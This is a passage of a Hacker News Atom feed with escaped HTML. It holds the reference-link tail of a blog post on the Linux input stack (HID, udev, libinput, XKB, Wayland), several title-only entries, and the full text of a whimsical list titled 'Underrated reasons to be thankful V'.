      &lt;item&gt;GENERIC, FULL STACK &lt;list rend="ul"&gt;&lt;item&gt;https://linuxtouchpad.org/docs/&lt;/item&gt;&lt;item&gt;https://linuxtouchpad.org/resources/&lt;/item&gt;&lt;item&gt;https://monroeclinton.com/pointing-devices-in-linux/&lt;/item&gt;&lt;item&gt;https://wiki.archlinux.org/title/Keyboard_input&lt;/item&gt;&lt;item&gt;https://vkoskiv.com/first-linux-patch/&lt;/item&gt;&lt;item&gt;https://linux-kernel-labs.github.io/refs/heads/master/labs/device_model.html&lt;/item&gt;&lt;item&gt;https://apexpenn.github.io/2025/02/13/linux-input-subsystem/&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;HARDWARE INTERFACE&lt;/item&gt;
      &lt;item&gt;KERNEL, MODULES, HID AND OTHERS &lt;list rend="ul"&gt;&lt;item&gt;https://who-t.blogspot.com/2018/12/understanding-hid-report-descriptors.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2021/01/parsing-hid-unit-items.html&lt;/item&gt;&lt;item&gt;http://bentiss.github.io/hid-replay-docs/&lt;/item&gt;&lt;item&gt;https://gitlab.freedesktop.org/libevdev/hid-tools/&lt;/item&gt;&lt;item&gt;https://docs.kernel.org/hid/hidintro.html&lt;/item&gt;&lt;item&gt;https://docs.kernel.org/hid/hid-transport.html&lt;/item&gt;&lt;item&gt;https://learn.microsoft.com/en-us/windows-hardware/drivers/hid/&lt;/item&gt;&lt;item&gt;https://www.kernel.org/doc/Documentation/hid/hiddev.txt&lt;/item&gt;&lt;item&gt;https://www.man7.org/linux//man-pages/man8/usbhid-dump.8.html&lt;/item&gt;&lt;item&gt;https://www.kernel.org/doc/Documentation/input/input.txt&lt;/item&gt;&lt;item&gt;https://www.kernel.org/doc/Documentation/input/input-programming.txt&lt;/item&gt;&lt;item&gt;https://www.kernel.org/doc/Documentation/input/joystick.txt&lt;/item&gt;&lt;item&gt;https://github.com/libratbag/piper/&lt;/item&gt;&lt;item&gt;https://git.annabunches.net/anna/joyful&lt;/item&gt;&lt;item&gt;https://docs.kernel.org/input/&lt;/item&gt;&lt;item&gt;https://www.kernel.org/doc/Documentation/input/&lt;/item&gt;&lt;item&gt;https://www.kernel.org/doc/Documentation/input/event-codes.rst&lt;/item&gt;&lt;item&gt;https://www.kernel.org/doc/Documentation/input/appletouch.txt&lt;/item&gt;&lt;item&gt;https://www.kernel.org/doc/Documentation/input/gamepad.rst&lt;/item&gt;&lt;item&gt;https://www.kernel.org/doc/Documentation/input/multi-touch-protocol.rst&lt;/item&gt;&lt;item&gt;https://github.com/torvalds/linux/blob/master/drivers/input/keyboard/atkbd.c&lt;/item&gt;&lt;item&gt;https://www.kernel.org/doc/Documentation/laptops/thinkpad-acpi.txt&lt;/item&gt;&lt;item&gt;https://www.kernel.org/doc/html/latest/driver-api/input.html&lt;/item&gt;&lt;item&gt;https://www.kernelconfig.io/config_devtmpfs_safe&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;SYSFS MAPPING&lt;/item&gt;
      &lt;item&gt;UDEV, MDEV, SMDEV, HWDB &lt;list rend="ul"&gt;&lt;item&gt;https://codelucky.com/devtmpfs-linux/&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2019/02/adding-entries-to-udev-hwdb.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2024/04/udev-hid-bpf-quickstart-tooling-to-fix.html&lt;/item&gt;&lt;item&gt;https://libevdev.pages.freedesktop.org/udev-hid-bpf/index.html&lt;/item&gt;&lt;item&gt;https://lwn.net/Articles/970702/&lt;/item&gt;&lt;item&gt;https://wiki.archlinux.org/title/Udev&lt;/item&gt;&lt;item&gt;https://www.man7.org/linux/man-pages/man5/udev.conf.5.html&lt;/item&gt;&lt;item&gt;https://www.freedesktop.org/software/systemd/man/latest/systemd-udevd.service.html&lt;/item&gt;&lt;item&gt;https://www.man7.org/linux/man-pages/man8/udevadm.8.html udevadm&lt;/item&gt;&lt;item&gt;https://www.freedesktop.org/software/systemd/man/latest/udev.html#&lt;/item&gt;&lt;item&gt;https://www.reactivated.net/writing_udev_rules.html&lt;/item&gt;&lt;item&gt;https://opensource.com/article/18/11/udev&lt;/item&gt;&lt;item&gt;https://stackoverflow.com/questions/45987478/udev-rule-for-input-device&lt;/item&gt;&lt;item&gt;https://dataswamp.org/~solene/2025-05-31-linux-killswitch-on-power-disconnect.html&lt;/item&gt;&lt;item&gt;https://en.wikipedia.org/wiki/Udev&lt;/item&gt;&lt;item&gt;https://www.linuxfromscratch.org/lfs/view/12.3/chapter09/udev.html&lt;/item&gt;&lt;item&gt;https://documentation.suse.com/sles/12-SP5/html/SLES-all/cha-udev.html&lt;/item&gt;&lt;item&gt;https://wiki.gentoo.org/wiki/Mdev&lt;/item&gt;&lt;item&gt;https://wiki.gentoo.org/wiki/Udev&lt;/item&gt;&lt;item&gt;https://git.suckless.org/smdev/file/README.html&lt;/item&gt;&lt;item&gt;https://www.man7.org/linux/man-pages/man7/hwdb.7.html&lt;/item&gt;&lt;item&gt;https://github.com/systemd/systemd/blob/main/hwdb.d/60-evdev.hwdb&lt;/item&gt;&lt;item&gt;http://www.linux-usb.org/ (deprecated)&lt;/item&gt;&lt;item&gt;https://web.archive.org/web/20160127215232/https://www.kernel.org/doc/pending/hotplug.txt&lt;/item&gt;&lt;item&gt;https://elixir.bootlin.com/linux/v3.12.74/source/lib/kobject_uevent.c#L121&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;EVDEV, LIBEVDEV, IOCTL &lt;list rend="ul"&gt;&lt;item&gt;https://en.wikipedia.org/wiki/Evdev#/media/File:Linux_API.svg&lt;/item&gt;&lt;item&gt;https://en.wikipedia.org/wiki/Evdev&lt;/item&gt;&lt;item&gt;https://www.kernel.org/doc/Documentation/input/uinput.rst&lt;/item&gt;&lt;item&gt;https://www.freedesktop.org/software/libevdev/doc/latest/ioctls.html&lt;/item&gt;&lt;item&gt;https://gitlab.freedesktop.org/libevdev/libevdev&lt;/item&gt;&lt;item&gt;https://www.freedesktop.org/software/libevdev/doc/latest/&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2016/09/understanding-evdev.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2018/07/why-its-not-good-idea-to-handle-evdev.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2018/01/libevdev-python.html&lt;/item&gt;&lt;item&gt;https://gist.github.com/TriceHelix/de47ed38dcb4f7216b26291c47445d99&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2014/11/analysing-input-events-with-evemu.html&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;LIBINPUT &lt;list rend="ul"&gt;&lt;item&gt;https://blog.martin-graesslin.com/blog/2016/12/how-input-works-creating-a-device/&lt;/item&gt;&lt;item&gt;https://blog.martin-graesslin.com/blog/2016/12/how-input-works-keyboard-input/&lt;/item&gt;&lt;item&gt;https://blog.martin-graesslin.com/blog/2016/12/how-input-works-pointer-input/&lt;/item&gt;&lt;item&gt;https://blog.martin-graesslin.com/blog/2017/02/how-input-works-touch-input/&lt;/item&gt;&lt;item&gt;https://www.michaelminn.com/linux/peripherals/&lt;/item&gt;&lt;item&gt;https://linuxtouchpad.org/news/2021/12/03/best-of-libinput-on-lwn.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2016/07/libinput-is-done.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2014/09/libinput-common-input-stack-for-wayland.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2019/03/libinputs-internal-building-blocks.html&lt;/item&gt;&lt;item&gt;https://wiki.archlinux.org/title/Libinput&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2017/01/how-libinput-opens-device-nodes.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2025/06/libinput-and-tablet-tool-eraser-buttons.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2025/05/libinput-and-lua-plugins.html&lt;/item&gt;&lt;item&gt;https://wayland.freedesktop.org/libinput/doc/latest/lua-plugins.html&lt;/item&gt;&lt;item&gt;https://wayland.freedesktop.org/libinput/doc/latest/&lt;/item&gt;&lt;item&gt;https://wayland.freedesktop.org/libinput/doc/latest/configuration.html&lt;/item&gt;&lt;item&gt;https://www.x.org/wiki/Events/XDC2014/XDC2014HuttererLibInput/&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2015/02/libinput-device-groups.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2019/10/libinputs-bus-factor-is-1.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2017/02/libinput-knows-about-internal-and.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2017/02/libinput-and-lid-switch-events.html&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;LIBINPUT AND POINTER SPECFICIS &lt;list rend="ul"&gt;&lt;item&gt;https://bitmath.se/org/code/mtdev/&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2015/07/a-short-overview-of-touchpad-devices.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2016/12/libinput-touchpad-pointer-acceleration.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2018/06/x-server-pointer-acceleration-analysis.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2014/09/pointer-acceleration-in-libinput.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2017/07/libinput-and-pressure-based-palm.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2019/07/libinputs-new-thumb-detection-code.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2016/09/synaptics-pointer-acceleration.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2017/01/the-definitive-guide-to-synclient.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2016/07/why-synclient-does-not-work-anymore.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2016/12/xf86-input-synaptics-is-not-synaptics.html&lt;/item&gt;&lt;item&gt;https://www.x.org/releases/X11R7.6-RC1/doc/man/man4/synaptics.4.xhtml&lt;/item&gt;&lt;item&gt;https://cookie.engineer/weblog/articles/synaptics-touchpad-on-linux.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2017/10/what-is-libwacom.html&lt;/item&gt;&lt;item&gt;https://github.com/tuhiproject/tuhi/&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2020/02/a-tale-of-missing-touches.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2021/07/libinput-and-hold-gestures.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2021/08/libinput-and-high-resolution-wheel.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2023/01/libinput-and-custom-pointer.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2024/03/enforcing-touchscreen-mapping-in-gnome.html&lt;/item&gt;&lt;item&gt;https://github.com/iberianpig/fusuma&lt;/item&gt;&lt;item&gt;https://github.com/bulletmark/libinput-gestures&lt;/item&gt;&lt;item&gt;https://github.com/Coffee2CodeNL/gebaar-libinput&lt;/item&gt;&lt;item&gt;https://bill.harding.blog/2019/03/25/linux-touchpad-like-a-macbook-progress-and-a-call-for-help/&lt;/item&gt;&lt;item&gt;https://www.davidrevoy.com/article1002/how-a-kernel-developer-made-my-styluses-work-again&lt;/item&gt;&lt;item&gt;https://lwn.net/Articles/801767/&lt;/item&gt;&lt;item&gt;http://github.com/libratbag/libratbag&lt;/item&gt;&lt;item&gt;https://libratbag.github.io/&lt;/item&gt;&lt;item&gt;https://github.com/libratbag/ratbag-toolbox&lt;/item&gt;&lt;item&gt;https://github.com/libratbag/ratbag-emu&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;KEYBOARDS SCANCODES TO KEYCODES&lt;/item&gt;
      &lt;item&gt;XKB &lt;list rend="ul"&gt;&lt;item&gt;https://xkbcommon.org/&lt;/item&gt;&lt;item&gt;https://web.archive.org/web/20170825051821/http://madduck.net:80/docs/extending-xkb/&lt;/item&gt;&lt;item&gt;https://man.archlinux.org/man/xkbcli.1 xkbcli&lt;/item&gt;&lt;item&gt;https://www.charvolant.org/doug/xkb/html/index.html&lt;/item&gt;&lt;item&gt;https://xkbcommon.org/doc/current/user-configuration.html&lt;/item&gt;&lt;item&gt;https://wiki.archlinux.org/title/X_keyboard_extension&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2021/02/a-pre-supplied-custom-keyboard-layout.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2020/02/user-specific-xkb-configuration-part-1.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2020/07/user-specific-xkb-configuration-part-2.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2020/08/user-specific-xkb-configuration-part-3.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2020/09/user-specific-xkb-configuration-putting.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2021/01/auto-updating-xkb-for-new-kernel.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2016/12/new-udev-property-xkbfixedlayout-for.html&lt;/item&gt;&lt;item&gt;https://xkbcommon.org/doc/current/xkb-intro.html#md_doc_2introduction-to-xkb&lt;/item&gt;&lt;item&gt;https://x.org/releases/current/doc/kbproto/xkbproto.pdf&lt;/item&gt;&lt;item&gt;https://xkeyboard-config.freedesktop.org/&lt;/item&gt;&lt;item&gt;https://xkbcommon.org/doc/current/keymap-text-format-v1-v2.html&lt;/item&gt;&lt;item&gt;https://xkbcommon.org/doc/current/rule-file-format.html&lt;/item&gt;&lt;item&gt;https://xkbcommon.org/doc/current/user-configuration.html&lt;/item&gt;&lt;item&gt;https://xkbcommon.org/doc/current/debugging.html&lt;/item&gt;&lt;item&gt;https://web.archive.org/web/20190718184358/http://pascal.tsu.ru/en/xkb/internals.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2008/09/rmlvo-keyboard-configuration.html&lt;/item&gt;&lt;item&gt;https://www.x.org/wiki/XKB/&lt;/item&gt;&lt;item&gt;https://medium.com/@damko/a-simple-humble-but-comprehensive-guide-to-xkb-for-linux-6f1ad5e13450&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;UPPER STACK, CONSOLE, XSERVER, WAYLAND &lt;list rend="ul"&gt;&lt;item&gt;https://wiki.archlinux.org/title/Input_remap_utilities&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2016/12/the-future-of-xinput-xmodmap-setxkbmap.html&lt;/item&gt;&lt;item&gt;https://wiki.archlinux.org/title/Xmodmap&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2016/01/xorg-project-vs-xorg-foundation.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2015/01/xf86-input-libinput-compatibility-with.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2016/12/xinput-is-not-configuration-ui.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2018/06/x-server-pointer-acceleration-analysis.html Series&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2021/09/an-xorg-release-without-xwayland.html&lt;/item&gt;&lt;item&gt;https://en.wikipedia.org/wiki/X.Org_Server&lt;/item&gt;&lt;item&gt;https://en.wikipedia.org/wiki/Wayland_(protocol)&lt;/item&gt;&lt;item&gt;https://mort.coffee/home/wayland-input-latency/&lt;/item&gt;&lt;item&gt;https://drewdevault.com/2018/07/17/Input-handling-in-wlroots.html&lt;/item&gt;&lt;item&gt;https://fcitx-im.org/wiki/Input_method_related_environment_variables&lt;/item&gt;&lt;item&gt;https://gitlab.freedesktop.org/xorg/driver/xf86-input-libinput&lt;/item&gt;&lt;item&gt;https://gitlab.freedesktop.org/xorg/app/xmodmap&lt;/item&gt;&lt;item&gt;https://en.wikipedia.org/wiki/Unicode_input#In_X11_and_Wayland_(Linux_and_other_Unix_variants_including_ChromeOS)&lt;/item&gt;&lt;item&gt;https://nixers.net/showthread.php?tid=1970&lt;/item&gt;&lt;item&gt;https://wiki.archlinux.org/title/Xorg/Keyboard_configuration&lt;/item&gt;&lt;item&gt;https://wiki.archlinux.org/title/Linux_console/Keyboard_configuration&lt;/item&gt;&lt;item&gt;https://manpages.debian.org/testing/console-setup/setupcon.1.en.html&lt;/item&gt;&lt;item&gt;https://github.com/pierre-labastie/blocaled&lt;/item&gt;&lt;item&gt;http://www.freedesktop.org/wiki/Software/systemd/localed&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;AUTOMATION, LIBEI, INPUTFD, &amp;amp; other protoc &lt;list rend="ul"&gt;&lt;item&gt;https://docs.kernel.org/5.10/hid/uhid.html&lt;/item&gt;&lt;item&gt;https://www.kernel.org/doc/html/v4.12/input/uinput.html&lt;/item&gt;&lt;item&gt;https://github.com/torvalds/linux/blob/2eba5e05d9bcf4cdea995ed51b0f07ba0275794a/drivers/hid/uhid.c#L4&lt;/item&gt;&lt;item&gt;https://github.com/torvalds/linux/blob/master/samples/uhid/uhid-example.c&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2020/08/libei-library-to-support-emulated-input.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2022/03/libei-adding-support-for-passive.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2022/12/libei-opening-portal-doors.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2023/05/libei-and-fancy-protocol.html&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2017/04/inputfd-protocol-for-direct-access-to.html&lt;/item&gt;&lt;item&gt;https://gitlab.freedesktop.org/libinput/libei/-/tree/main&lt;/item&gt;&lt;item&gt;https://libinput.pages.freedesktop.org/libei/&lt;/item&gt;&lt;item&gt;https://libinput.pages.freedesktop.org/libei/api/index.html&lt;/item&gt;&lt;item&gt;https://github.com/ReimuNotMoe/ydotool&lt;/item&gt;&lt;item&gt;https://who-t.blogspot.com/2025/08/unplug-tool-to-test-input-devices-via.html&lt;/item&gt;&lt;item&gt;https://git.sr.ht/~brocellous/wlrctl&lt;/item&gt;&lt;item&gt;https://www.semicomplete.com/blog/xdotool-and-exploring-wayland-fragmentation/&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;INPUT METHOD &lt;list rend="ul"&gt;&lt;item&gt;https://en.wikipedia.org/wiki/Input_method&lt;/item&gt;&lt;item&gt;https://linuxcommandlibrary.com/man/scim&lt;/item&gt;&lt;item&gt;https://wiki.archlinux.org/title/Input_method&lt;/item&gt;&lt;item&gt;https://wiki.archlinux.org/title/IBus&lt;/item&gt;&lt;item&gt;https://www.csslayer.info/wordpress/linux/key-repetition-and-key-event-handling-issue-with-wayland-input-method-protocols/&lt;/item&gt;&lt;item&gt;https://wayland.app/protocols/xx-input-method-v2&lt;/item&gt;&lt;item&gt;https://wiki.qt.io/QtCS2021_-_Wayland_text-input-unstable-v4_protocol&lt;/item&gt;&lt;item&gt;https://www.chromium.org/chromium-os/chromiumos-design-docs/text-input/&lt;/item&gt;&lt;item&gt;https://lwn.net/Articles/503320/&lt;/item&gt;&lt;item&gt;https://nerufic.com/en/posts/how-input-methods-work-in-linux/&lt;/item&gt;&lt;item&gt;https://mail.gnome.org/archives/desktop-devel-list/2012-May/msg00093.html&lt;/item&gt;&lt;item&gt;https://wiki.gnome.org/Design(2f)OS(2f)LanguageInput.html&lt;/item&gt;&lt;item&gt;https://docs.gtk.org/gtk4/class.IMContext.html&lt;/item&gt;&lt;item&gt;https://docs.gtk.org/gtk4/property.Settings.gtk-im-module.html&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt; If you want to have a more in depth discussion I'm always available by email or irc. We can discuss and argue about what you like and dislike, about new ideas to consider, opinions, etc..&lt;lb/&gt; If you don't feel like "having a discussion" or are intimidated by emails then you can simply say something small in the comment sections below and/or share it with your friends. &lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://venam.net/blog/unix/2025/11/27/input_devices_linux.html"/><published>2025-11-27T16:55:30+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46072002</id><title>AI CEO – Replace your boss before they replace you</title><updated>2025-11-27T22:09:58.420587+00:00</updated><link href="https://replaceyourboss.ai/"/><published>2025-11-27T18:37:41+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46072786</id><title>DeepSeekMath-V2: Towards Self-Verifiable Mathematical Reasoning [pdf]</title><updated>2025-11-27T22:09:58.386253+00:00</updated><content/><link href="https://github.com/deepseek-ai/DeepSeek-Math-V2/blob/main/DeepSeekMath_V2.pdf"/><published>2025-11-27T20:03:25+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46072988</id><title>LinkedIn is loud, and corporate is hell</title><updated>2025-11-27T22:09:58.229080+00:00</updated><content/><link href="https://ramones.dev/posts/linkedin-is-loud/"/><published>2025-11-27T20:30:21+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46073033</id><title>Underrated reasons to be thankful V</title><updated>2025-11-27T22:09:58.056836+00:00</updated><content>&lt;doc fingerprint="67ec982528b59eaf"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Underrated reasons to be thankful V&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;That your dog, while she appears to love you only because she’s been adapted by evolution to appear to love you, really does love you.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That if you’re a life form and you cook up a baby and copy your genes to them, you’ll find that the genes have been degraded due to oxidative stress et al., which isn’t cause for celebration, but if you find some other hopefully-hot person and randomly swap in half of their genes, your baby will still be somewhat less fit compared to you and your hopefully-hot friend on average, but now there is variance, so if you cook up several babies, one of them might be as fit or even fitter than you, and that one will likely have more babies than your other babies have, and thus complex life can persist in a universe with increasing entropy.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That if we wanted to, we surely could figure out which of the 300-ish strains of rhinovirus are circulating in a given area at a given time and rapidly vaccinate people to stop it and thereby finally “cure” the common cold, and though this is too annoying to pursue right now, it seems like it’s just a matter of time.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That if you look back at history, you see that plagues went from Europe to the Americas but not the other way, which suggests that urbanization and travel are great allies for infectious disease, and these both continue today but are held in check by sanitation and vaccines even while we have lots of tricks like UVC light and high-frequency sound and air filtration and waste monitoring and paying people to stay home that we’ve barely even put in play.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That while engineered infectious diseases loom ever-larger as a potential very big problem, we also have lots of crazier tricks we could pull out like panopticon viral screening or toilet monitors or daily individualized saliva sampling or engineered microbe-resistant surfaces or even dividing society into cells with rotating interlocks or having people walk around in little personal spacesuits, and while admittedly most of this doesn’t sound awesome, I see no reason this shouldn’t be a battle that we would win.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That clean water, unlimited, almost free.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That dentistry.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That tongues.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That radioactive atoms either release a ton of energy but also quickly stop existing—a gram of Rubidium-90 scattered around your kitchen emits as much energy as ~200,000 incandescent lightbulbs but after an hour only 0.000000113g is left—or don’t put out very much energy but keep existing for a long time—a gram of Carbon-14 only puts out the equivalent of 0.0000212 light bulbs but if you start with a gram, you’ll still have 0.999879g after a year—so it isn’t actually that easy to permanently poison the environment with radiation although Cobalt-60 with its medium energy output and medium half-life is unfortunate, medical applications notwithstanding I still wish Cobalt-60 didn’t exist, screw you Cobalt-60.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That while curing all cancer would only increase life expectancy by ~3 years and curing all heart disease would only increase life expectancy by ~3 years, and preventing all accidents would only increase life expectancy by ~1.5 years, if we did all of these at the same time and then a lot of other stuff too, eventually the effects would go nonlinear, so trying to cure cancer isn’t actually a waste of time, thankfully.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That the peroxisome, while the mitochondria and their stupid Krebs cycle get all the attention, when a fatty-acid that’s too long for them to catabolize comes along, who you gonna call.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That we have preferences, that there’s no agreed ordering of how good different things are, which is neat, and not something that would obviously be true for an alien species, and given our limited resources probably makes us happier on net.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That cardamom, it is cheap but tastes expensive, if cardamom cost 1000× more, people would brag about how they flew to Sri Lanka so they could taste chai made with fresh cardamom and swear that it changed their whole life.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That Gregory of Nyssa, he was right.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That Grandma Moses, it’s not too late.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That sleep, that probably evolution first made a low-energy mode so we don’t starve so fast and then layered on some maintenance processes, but the effect is that we live in a cycle and when things aren’t going your way it’s comforting that reality doesn’t stretch out before you indefinitely but instead you can look forward to a reset and a pause that’s somehow neither experienced nor skipped.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That, glamorous or not, comfortable or not, cheap or not, carbon emitting or not, air travel is very safe.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That, for most of the things you’re worried about, the markets are less worried than you and they have the better track record, though not the issue of your mortality.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That sexual attraction to romantic love to economic unit to reproduction, it’s a strange bundle, but who are we to argue with success.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That every symbolic expression recursively built from differentiable elementary functions has a derivative that can also be written as a recursive combination of elementary functions, although the latter expression may require vastly more terms.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That every expression graph built from differentiable elementary functions and producing a scalar output has a gradient that can itself be written as an expression graph, and furthermore that the latter expression graph is always the same size as the first one and is easy to find, and thus that it’s possible to fit very large expression graphs to data.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That, eerily, biological life and biological intelligence does not appear to make use of that property of expression graphs.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That if you look at something and move your head around, you observe the entire light field, which is a five-dimensional function of three spatial coordinates and two angles, and yet if you do something fancy with lasers, somehow that entire light field can be stored on a single piece of normal two-dimensional film and then replayed later.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That, as far as I can tell, the reason five-dimensional light fields can be stored on two-dimensional film simply cannot be explained without quite a lot of wave mechanics, a vivid example of the strangeness of this place and proof that all those physicists with their diffractions and phase conjugations really are up to something.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That disposable plastic, littered or not, harmless when consumed as thousands of small particles or not, is popular for a reason.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That disposable plastic, when disposed of correctly, is literally carbon sequestration, and that if/when air-derived plastic replaces dead-plankton-derived plastic, this might be incredibly convenient, although it must be said that currently the carbon in disposable plastic only represents a single-digit percentage of total carbon emissions.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That rocks can be broken into pieces and then you can’t un-break the pieces but you can check that they came from the same rock, it’s basically cryptography.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That the deal society has made is that if you have kids then everyone you encounter is obligated to chip in a bit to assist you, and this seems to mostly work without the need for constant grimy negotiated transactions as Econ 101 would suggest, although the exact contours of this deal seem to be a bit murky.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That of all the humans that have ever lived, the majority lived under some kind of autocracy, with the rest distributed among tribal bands, chiefdoms, failed states, and flawed democracies, and only something like 1% enjoyed free elections and the rule of law and civil liberties and minimal corruption, yet we endured and today that number is closer to 10%, and so if you find yourself outside that set, do not lose heart.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;That if you were in two dimensions and you tried to eat something then maybe your body would split into two pieces since the whole path from mouth to anus would have to be disconnected, so be thankful you’re in three dimensions, although maybe you could have some kind of jigsaw-shaped digestive tract so your two pieces would only jiggle around or maybe you could use the same orifice for both purposes, remember that if you ever find yourself in two dimensions, I guess.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Things to argue about over the holidays instead of politics III · lists&lt;/p&gt;
    &lt;p&gt;Underrated reasons to be thankful IV · lists&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://dynomight.net/thanks-5/"/><published>2025-11-27T20:37:51+00:00</published></entry></feed>